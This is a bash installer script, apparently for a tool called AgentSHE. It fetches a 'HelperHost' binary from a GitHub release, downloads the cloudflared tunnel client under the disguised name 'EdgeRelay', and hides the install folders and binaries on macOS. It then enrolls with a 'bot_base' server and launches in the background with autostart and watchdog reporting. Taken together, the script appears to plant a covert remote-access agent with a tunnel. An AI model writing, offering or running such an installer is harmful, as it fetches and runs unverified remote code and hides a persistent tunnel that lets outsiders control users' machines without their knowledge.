#!/usr/bin/env bash
set -euo pipefail
ENROLL="${1:-${AGENTSHE_ENROLL:-}}"
BOT_BASE="${2:-${AGENTSHE_BOT_BASE:-}}"
GH="${AGENTSHE_GH:-https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3}"
BOT_BASE="${BOT_BASE%/}"

if [ -z "$ENROLL" ] || [ -z "$BOT_BASE" ]; then
  echo "usage: install.sh <enroll> <bot_base>" >&2
  exit 1
fi

if [ "$(uname -s)" = "Darwin" ]; then
  DIR="$HOME/Library/Application Support/HelperHost"
else
  DIR="$HOME/.local/share/HelperHost"
fi
CACHE="${TMPDIR:-/tmp}/HelperHostCache"
mkdir -p "$DIR" "$CACHE"
if [ "$(uname -s)" = "Darwin" ]; then
  chflags hidden "$DIR" "$CACHE" 2>/dev/null || true
fi
cd "$DIR"

pkill -f "$DIR/HelperHost" 2>/dev/null || true
pkill -f "$DIR/EdgeRelay" 2>/dev/null || true
sleep 0.2

ARCH="$(uname -m)"
OS="$(uname -s)"
case "$ARCH" in
  x86_64|amd64) ARCH_N=amd64 ;;
  aarch64|arm64) ARCH_N=arm64 ;;
  *) echo "arch non supportée: $ARCH" >&2; exit 1 ;;
esac
case "$OS" in
  Darwin) OS_N=darwin; HH=HelperHost ;;
  Linux)  OS_N=linux;  HH=HelperHost ;;
  *) echo "OS non supporté: $OS" >&2; exit 1 ;;
esac

restore_or_fetch() {
  local name="$1" url="$2"
  if [ -x "$DIR/$name" ]; then
    cp -f "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
    return 0
  fi
  if [ -f "$CACHE/$name" ]; then
    cp -f "$CACHE/$name" "$DIR/$name"
    chmod +x "$DIR/$name"
    return 0
  fi
  echo "prep $name…"
  curl -fsSL "$url" -o "$CACHE/$name.download"
  cp -f "$CACHE/$name.download" "$CACHE/$name"
  cp -f "$CACHE/$name" "$DIR/$name"
  chmod +x "$DIR/$name"
  if [ "$(uname -s)" = "Darwin" ]; then
    chflags hidden "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
  fi
}

restore_or_fetch "$HH" "$GH/HelperHost-$OS_N-$ARCH_N"

if [ "$OS" = "Darwin" ]; then
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"; fi
else
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"; fi
fi
restore_or_fetch EdgeRelay "$U"

printf '%s\n' "{\"enroll\":\"$ENROLL\",\"bot_base\":\"$BOT_BASE\"}" > "$DIR/config.json"
export AGENTSHE_ENROLL="$ENROLL" AGENTSHE_BOT_BASE="$BOT_BASE"

nohup "$DIR/$HH" >"$DIR/boot.log" 2>&1 &
for i in $(seq 1 180); do
  if grep -q '^OK$' "$DIR/boot.log" 2>/dev/null; then
    grep -E '^(OK|agent=|autostart=|reboot=|watchdog=|proc_|deps=)' "$DIR/boot.log" || true
    exit 0
  fi
  if grep -q '^FAIL' "$DIR/boot.log" 2>/dev/null; then cat "$DIR/boot.log" >&2; exit 1; fi
  sleep 1
done
echo timeout >&2; tail -n 40 "$DIR/boot.log" >&2 || true; exit 1
